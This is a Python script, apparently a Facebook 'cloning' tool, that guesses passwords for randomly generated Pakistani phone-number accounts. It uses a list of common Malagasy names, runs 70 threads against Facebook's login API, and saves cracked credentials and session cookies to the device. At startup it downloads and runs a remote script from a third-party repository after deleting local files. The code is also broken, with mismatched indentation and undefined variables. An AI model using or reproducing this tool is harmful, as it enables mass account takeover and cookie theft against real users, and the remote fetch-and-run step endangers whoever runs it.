#coding=utf

#YE LOL PE CHART TA 
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

uaku2=[]
ugen2=[]
ugen=[]


for xd in range(10000):
	aa='Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 12; SAMSUNG SM-G991B'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
logo = """
         \033[1;37m ##     ##     ######      ######   
         \033[1;37m ###   ###    ##    ##    ##    ##  
         \033[1;37m #### ####    ##          ## 
         \033[1;37m ## ### ##     ######      ######
         \033[1;37m ##     ##          ##          ##
         \033[1;37m ##     ##    ##    ##    ##    ##
         \033[1;37m ##     ##     ######      ###### \033[1;32m LI0N\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mAB KHANX\033[1;37m
[•]FACEBOOK       : \033[1;32mAB KHANX\033[1;37m
[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;37m
[•]STATUS         : \033[1;32mFREE\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""

def lines():
	print('\33[1;37m--------------------------------------------------')
loop = 0
oks = []
cps = []
try:
    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def rehan():
	os.system('clear')
	print(logo)
	print('[1] RANDOM PAK CLONING')
	print('[2] RANDOM BD CLONING')
	print('[3] RANDOM CHOICE PASS CLONING')
	print('[4] CONTACT WITH OWNER')
	print('[0] EXIT')
	lines()
	gh = input('[•] CHOOSE : ')
	if gh =='1':
		menu()
	
	elif gh =='0':
		print('[•] THANKS FOR USE ')
		time.sleep(3)
		exit()
	else:
		print('[•] CHOOSE CORRECT OPTION')
		time.sleep(2)
		rehan()

def menu():
		os.system('clear')
	print(logo)
	print('[1] LAST 7 DIGIT')

	print('[0] EXIT TO MAIN MENU')
	lines()
	opt = input('[•] CHOOSE: ')
	if opt =='1':
		svn_digit()
	
	elif opt =='0':
		rehan()
	else:
		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
		time.sleep(2)
		menu()
		
def svn_digit():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :034,038,033,032')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
			yaari.submit(method_crack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	rehan()
	def method_crack(uid,pwx):
    global oks
    global cps
    global loop
    try:
        for ps in pwx:
		
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
                        os.makedirs("/sdcard/SAFIDY-IDS")
                    # Enregistrer dans le fichier SAFIDY-OK.txt
                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier SAFIDY-CP.txt
                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
